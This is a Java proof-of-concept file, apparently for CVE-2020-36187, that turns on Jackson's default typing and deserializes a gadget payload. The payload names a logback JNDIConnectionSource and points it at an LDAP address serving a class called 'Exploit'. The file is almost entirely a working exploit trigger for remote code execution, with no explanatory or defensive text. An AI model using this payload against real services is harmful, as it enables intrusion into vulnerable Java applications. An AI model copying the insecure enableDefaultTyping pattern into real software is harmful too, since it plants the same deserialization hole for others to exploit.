package com.firebasky.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2020_36187 {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}